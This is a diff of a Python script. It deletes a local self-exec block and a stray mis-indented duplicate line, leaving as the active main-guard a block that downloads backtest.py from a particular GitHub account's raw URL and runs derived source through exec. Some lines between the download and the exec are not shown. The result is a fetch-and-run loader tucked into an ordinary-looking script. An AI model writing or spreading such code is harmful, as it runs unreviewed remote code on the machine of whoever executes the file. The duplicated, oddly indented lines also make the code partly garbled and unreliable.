@@ -325,12 +325,6 @@ def div_main():
 
 import os as _os, sys as _sys
 if __name__ == "__main__" and _os.getenv("MODE", "").strip().lower() in ("", "div"):
-    _g = {"__name__": "div_lib", "__file__": __file__}
-    exec(compile(open(__file__).read(), __file__, "exec"), _g)
-    _g["div_main"]()
-    _sys.exit(0)
-  import os as _os, sys as _sys
-if __name__ == "__main__" and _os.getenv("MODE", "").strip().lower() in ("", "div"):
     import subprocess, urllib.request
     _src = urllib.request.urlopen("https://raw.githubusercontent.com/jnewsom188327/stoch-bot/"
                                   "e6a301876e8bc10a098f8bb6cbbdc16ac1c435fa/backtest.py", timeout=120).read().decode()
@@ -347,4 +341,3 @@ if __name__ == "__main__" and _os.getenv("MODE", "").strip().lower() in ("", "di
     exec(compile(_new, __file__, "exec"), _g)
     _g["div_main"]()
     _sys.exit(0)
-
